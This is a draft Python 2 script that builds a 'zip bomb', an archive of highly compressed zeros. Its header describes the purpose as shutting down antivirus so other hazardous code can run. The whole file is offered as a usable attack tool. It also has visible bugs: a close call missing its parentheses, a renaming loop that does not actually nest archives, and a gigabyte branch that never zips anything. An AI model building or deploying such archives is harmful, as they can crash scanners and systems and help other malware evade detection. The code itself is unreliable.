'''
Joshua Franke
Creates a Zip Bomb (without malicious code in it)
Version: Alpha 

A zipbomb is a series of highly compressed files that is used to shut down an
antivirus so other hazardous code can run. Most modern antivirus programs
know how to treat these files now.



THIS IS A ROUGH DRAFT. THE CODE WILL BE PRETTIER SOON. (Ex: Adding loops,
looking for different methods, orginization, adding print statements for the console, etc.)
'''

############################ Variables ######################################
#############################################################################
import zipfile
import shutil
import os

# numBytes isn't needed but I left it here in order to show the logic.
numBytes = 1
numKilos = 1024 * numBytes
numMegas = 1024 * numKilos


numGigas = 0 # Place holder




'''                           Side Note

You get a memory error by using numGigas the way I have created the other
variables. In order to avoid this problem I created a nested for loop.
'''



# Change this to change how many 0s to write to the file.
num = numMegas
###############################################################################






######################### Write to File Functions #############################
###############################################################################
# If you want a file smaller than multiple Gigs this will write that many 0s
def other():
    for x in range(0,num):
        file.write("0")
    file.close()


# If you want a file larger than a Gig this will write that many 0s
def GigFunction():
    count = 0
    for x in range(0,1024):
        for x in range(0,num):
            file.write("0")
        count += 1
        print str(count) + " MB Written"
    file.close()

###############################################################################









############################# Copy & Zipping Function #########################
###############################################################################
def copyNzip():
    # Creates a zip file
    zf = zipfile.ZipFile("0.zip","w")
    # Without compress_type with file will not be smaller
    zf.write("run.txt",compress_type=zipfile.ZIP_DEFLATED)
    zf.close
    
    os.remove("run.txt")
    
    # First Branch
    zf = zipfile.ZipFile("secondBranch.zip","w")
    
    for x in range(0,16):
        fl = str(x) + ".zip"
        fl2 = str(x+1) + ".zip"
        zf.write(fl,compress_type=zipfile.ZIP_DEFLATED)
        os.rename(fl,fl2)
    zf.close()
    os.remove("16.zip")

###############################################################################






################################ Main Code ####################################
###############################################################################
# Creates a file called run.txt
file = open("run.txt","w")
    
# Find correct function to call
if num == numGigas:
    num = numMegas
    GigFunction()
else:
    other()
    copyNzip()
###############################################################################
